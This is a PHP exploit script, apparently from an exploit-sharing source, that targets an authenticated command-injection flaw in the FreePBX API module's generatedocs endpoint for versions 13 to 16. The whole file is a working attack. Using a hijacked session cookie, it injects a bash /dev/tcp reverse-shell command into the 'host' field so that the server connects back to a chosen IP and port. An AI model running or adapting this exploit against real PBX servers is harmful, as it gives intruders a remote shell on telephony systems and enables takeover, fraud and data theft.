<?php
///
/// FREEPBX 2023 [13,14,15,16] low level Authenticated RCE 
/// Orginal Difcon || https://www.youtube.com/watch?v=rqFJ0BxwlLI
/// Cod[3]d by Cold z3ro 
///
$url = "https://freebpx";
$backconnectip = "127.0.0.1";
$port = "4444"; 
$PHPSESSID = "ve6bimvtdeg9i3o3spd61cfct4";

	echo "checking $url\n";
	$url = trim($url);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url.'/admin/ajax.php?module=api&command=generatedocs');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
	curl_setopt($ch, CURLOPT_TIMEOUT, 2);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Referer: '.$url.'/admin/config.php?display=api',
		'Content-Type: application/x-www-form-urlencoded',
	]);
	curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID='.$PHPSESSID);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'scopes=rest&host=http://'.$backconnectip.'/$(/bin/bash -i >& /dev/tcp/'.$backconnectip.'/'.$port.' 0>&1)');
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

	echo $response = curl_exec($ch)."\n";

	curl_close($ch);

?>
